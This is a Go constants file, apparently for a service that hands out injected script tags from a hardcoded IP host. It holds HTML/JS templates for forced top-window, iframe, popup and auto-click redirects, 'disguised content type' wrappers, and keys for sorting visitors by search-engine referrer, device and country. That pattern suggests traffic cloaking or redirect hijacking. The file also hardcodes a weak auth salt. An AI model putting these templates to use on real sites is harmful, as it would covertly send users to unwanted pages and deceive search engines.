package constant

// Auth
const (
	Salt          = "JS Secret"
	Authorization = "Bearer"
)

// tableName
const (
	CostCategory = "category"
	Account      = "account"
)

// http request
const (
	ID         = "id"
	IDS        = "ids"
	PrimaryID  = "pid"
	CategoryID = "cid"
	JsID       = "js_id"
	RoleID     = "role_id"
	BeginAt    = "begin_at"
	EndAt      = "end_at"
	Year       = "year"
	Date       = "date"
	TimeAt     = "time_at"
	File       = "uploadfile"
	Status     = "status"
)

// pagination key
const (
	Page       = "page"
	PageSize   = "page_size"
	TextSearch = "keywords"
)

const (
	// jsp 文件ip处理，为解决
	// IPLocation = "http://whois.pconline.com.cn/ipJson.jsp?ip=%s&json=true"

	IPLocation = "http://ip-api.com/json/%s?lang=zh-CN"
	IP         = "ip"
)

const (
	DefaultJsDomain = "16.163.50.48:8082"
	JSiteForm       = `<script type="text/javascript" src="https://%s/%s"></script>`
)

const (
	RedirectBlank = `window.location.href="%s";`
	BlankCode     = "about:blank"
	TestBaidu     = "https://www.baidu.com"

	// 直接跳转 windows
	RedirectWindowsPage = `window.location.href="%s"`

	// 直接跳转 top
	RedirectTopPage = `window.top.location.href="%s"`

	// 嵌套跳转
	NestingRedirect = `
	<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>嵌套跳转</title>
</head>
<body>
    <script>
        window.onload = function () {
            // 创建div标签
            var div = document.createElement("div");
            // 给标签添加id
            div.setAttribute("id", "container");
            // 将div标签插入到body
            document.body.appendChild(div);

            // 渲染
            document.getElementById("container").innerHTML = '<iframe src= %s></iframe>';
        }
    </script>
</body>
</html>`

	// 屏幕跳转
	ScreenRedirect = `
	<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>屏幕跳转</title>

</head>

<body>
    <script>
        window.open('%s')
    </script>
</body>
</html>`

	// href 跳转
	HrefRedirect = `
	<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>href跳转</title>
    <script>
        window.onload = function () {
            let url = "%s";
            // 创建div标签
            var a = document.createElement("a");
            // 给标签添加id
            a.setAttribute("id", "a-link");
            // 给标签添加href
            a.setAttribute("href", url);
            // 将div标签插入到body
            document.body.appendChild(a);
            document.getElementById("a-link").click();
        }
    </script>
</head>
<body>
</body>
</html>`
)

// 伪装内容类型
const (
	TextHtml = `
	<html>  
<head>  
<title>text/html</title>  
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" /> 
</head> 
<body> 
    <h1>%s</h1>
</body> 
</html> `

	TextPlain = `%s`

	TextXml = `<?xml version="1.0" encoding="UTF-8"?>
	<text>%s</text>`

	ApplicationJson = `{"text": %s}`
)

const (
	// 国内
	CN_ISO_CODE = "CN"
	// 香港
	HK_ISO_CODE = "HK"
	// 澳门
	MO_ISO_CODE = "MO"
	// 台湾
	TW_ISO_CODE = "TW"
	// 美国
	US_ISO_CODE = "US"
)

//device
const (
	// 移动端
	MOBILE = "iphone & ipod & ipad & android & mobile & blackberry & webos & incognito & webmate & bada & nokia & lg & ucweb & skyfire"

	// 设备类型
	IOS     = "iphone & ipod & ipad & ios"
	Android = "android"

	// PC
	PCType = 1
	// 移动端
	MobileType = 0
)

// 来源
const (
	FromTypeNone   = 0
	FromTypeKey    = 1
	FromTypeEngine = 2
)

// Engine
const (
	Baidu   = 0
	UC      = 1
	SLL     = 2 // 360
	SOU_GOU = 3
	GOOGLE  = 4
	Bing    = 5

	BaiduSearch          = "baidu"
	UCSearch             = "ubrowser"
	UCSearchPrepare      = "uc"
	SLLSearch            = "360" // 360
	SOU_GOUSearch        = "metasr"
	SOU_GOUSearchPrepare = "sougou"
	BingSearch           = "edge"
	BingSearchPrepare    = "bing"
	GOOGLESearch         = "chrome"
	GOOGLESearchPrepare  = "google"
)

// 跳转方式
const (
	Direct = 0
	Nested = 1
	Screen = 2
	Href   = 3
)

// 跳转设备类型地址
const (
	PCRedirectType      = 0
	AndroidRedirectType = 1
	IOSRedirectType     = 2
)

// cookie
const (
	CookieKey = "js_cookie"
	Expire    = 60 * 60 * 24
)

// visitType
const (
	IPVisit = 0
	UVVisit = 1
)

// time format
const (
	DateTimeFormat = "2006-01-02 15:04:05"
	DateFormat     = "2006-01-02"
)
